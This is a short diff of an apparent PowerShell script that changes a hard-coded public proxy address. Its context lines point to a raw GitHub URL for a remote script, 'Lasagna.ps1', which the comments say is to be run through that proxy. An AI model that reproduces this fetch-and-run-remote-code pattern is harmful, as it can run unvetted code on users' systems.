@@ -1,5 +1,5 @@
 # Set the proxy server information (replace with your proxy server details)
-$proxyServer = "98.188.47.132:4145"
+$proxyServer = "43.157.8.79:8888"
 
 # Set the URL of the PowerShell script you want to run
 $scriptURL = "https://raw.githubusercontent.com/MarkDenkmn/MarkDenkmn/main/Lasagna.ps1"
